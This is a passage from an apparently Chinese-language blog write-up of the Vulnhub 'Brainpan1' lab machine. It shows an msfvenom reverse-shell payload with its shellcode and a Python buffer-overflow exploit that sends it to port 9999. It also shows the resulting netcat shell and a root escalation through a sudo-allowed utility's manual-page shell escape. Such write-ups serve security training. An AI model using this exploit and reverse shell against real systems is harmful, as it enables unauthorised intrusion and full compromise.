class=\"hljs-number\"\u003e.418\u003c/span\u003e]\n(c) \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e Microsoft Corporation����������Ȩ����\n\nC:\\Users\\ensp\\Desktop\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获得shell\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e生成linux下的反弹shell代码覆盖之前windows的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p linux/x86/shell_reverse_tcp -b \u003cspan class=\"hljs-string\"\u003e'\\x00\\x0a\\x0d'\u003c/span\u003e LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e x86/shikata_ga_nai -f python\n[-] No platform was selected, choosing Msf::Module::Platform::Linux \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: x86 \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nFound \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e compatible encoders\nAttempting to encode payload \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e size \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e (iteration=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\nx86/shikata_ga_nai chosen \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e final size \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e\nPayload size: \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nFinal size of python file: \u003cspan class=\"hljs-number\"\u003e479\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nbuf =  \u003cspan class=\"hljs-string\"\u003eb\"\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xdb\\xcf\\xbe\\xfd\\x3c\\x9e\\x52\\xd9\\x74\\x24\\xf4\\x5f\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x33\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x3a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x38\\x7c\\xa7\\xf5\\x9a\\x77\\xab\\xa6\\x5f\\x2b\\x46\\x4a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xe9\\x2a\\x26\\x2c\\x24\\x2c\\xd4\\xe9\\x06\\x12\\x16\\x89\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x2e\\x14\\x51\\xe1\\x70\\x4e\\xea\\x66\\x18\\x8d\\xed\\x8c\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x0b\\x18\\x0c\\x3c\\xcd\\x4b\\x9e\\x6f\\xa1\\x6f\\xa9\\x6e\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x08\\xef\\xfb\\x18\\xfd\\xdf\\x88\\xb0\\x69\\x0f\\x40\\x22\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x03\\xc6\\x7d\\xf0\\x80\\x51\\x60\\x44\\x2d\\xaf\\xe3\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发送，获得shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\nbuf =  \u003cspan class=\"hljs-string\"\u003eb\"\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xdb\\xcf\\xbe\\xfd\\x3c\\x9e\\x52\\xd9\\x74\\x24\\xf4\\x5f\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x33\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x3a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x38\\x7c\\xa7\\xf5\\x9a\\x77\\xab\\xa6\\x5f\\x2b\\x46\\x4a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xe9\\x2a\\x26\\x2c\\x24\\x2c\\xd4\\xe9\\x06\\x12\\x16\\x89\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x2e\\x14\\x51\\xe1\\x70\\x4e\\xea\\x66\\x18\\x8d\\xed\\x8c\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x0b\\x18\\x0c\\x3c\\xcd\\x4b\\x9e\\x6f\\xa1\\x6f\\xa9\\x6e\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x08\\xef\\xfb\\x18\\xfd\\xdf\\x88\\xb0\\x69\\x0f\\x40\\x22\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x03\\xc6\\x7d\\xf0\\x80\\x51\\x60\\x44\\x2d\\xaf\\xe3\"\u003c/span\u003e\na = \u003cspan class=\"hljs-string\"\u003eb'A'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003eb'\\xf3\\x12\\x17\\x31'\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003eb'\\x90'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e+buf\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.166'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a)\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e50714\u003c/span\u003e\nls\nchecksrv.sh\nweb\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e尝试获得交互性更好的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/sh')\"\u003c/span\u003e  \n$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(puck) gid=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(puck) groups=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(puck)\n//\n$ uname -a\nLinux brainpan \u003cspan class=\"hljs-number\"\u003e3.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux\u003c/span\u003e\n//\n$ ip add\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e16436\u003c/span\u003e qdisc noqueue state UNKNOWN \n    link/loopback \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e\n    inet \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e scope host lo\n    inet6 ::\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e scope host \n       valid_lft forever preferred_lft forever\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UNKNOWN qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:e7:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:be brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e scope \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e eth0\n    inet6 fe80::20c:29ff:fee7:37be/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link \n       valid_lft forever preferred_lft forever\n$ \n//\n$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\nfind / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ping6\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ping\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mtr\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudoedit\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/traceroute6.iputils\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/lppasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/sbin/uuidd\n/usr/sbin/pppd\n/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/validate\n/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/pt_chown\n//\nsudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e puck on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser puck may run the following commands on this host:\n    (root) NOPASSWD: /home/anansi/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/anansi_util\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现anansi拥有sudo权限\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试提权\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esudo /home/anansi/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/anansi_util\n//\nUsage: /home/anansi/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/anansi_util [action]\nWhere [action] \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e one of:\n  - network\n  - proclist\n  - manual [command]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看到 \u003ccode\u003e- manual [command]\u003c/code\u003e可以跟命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ sudo /home/anansi/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/anansi_util manual ls      \nsudo /home/anansi/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/anansi_util manual ls\nNo manual entry \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e manual\nWARNING: terminal \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e fully functional\n-  (press RETURN)!/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里有交互，因为输入了ls，所以应该使用root权限下执行的，我们尝试输入\u003ccode\u003e!/bin/sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\n!/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\nroot@brainpan:/usr/share/man\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提权成功\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e缓冲区溢出漏洞，ret2shellcode类型，补习坏字节检测以及nop\u003c/p\u003e","title":"Vulnhub - Brainpan1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Brainpan1 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是166 2. 扫描主机开放端口 3. 扫描主机服务版本以及系统版本 扫出了很奇怪的东西 4. 扫描漏洞 什么都没有 9999端口 1. 在浏览器访问出现了 2. 使用nc连接尝试 尝试输..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"VulnhubBrainpan1"},"buildId":"88HS9mtGKBYYdCm8EXeaK","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>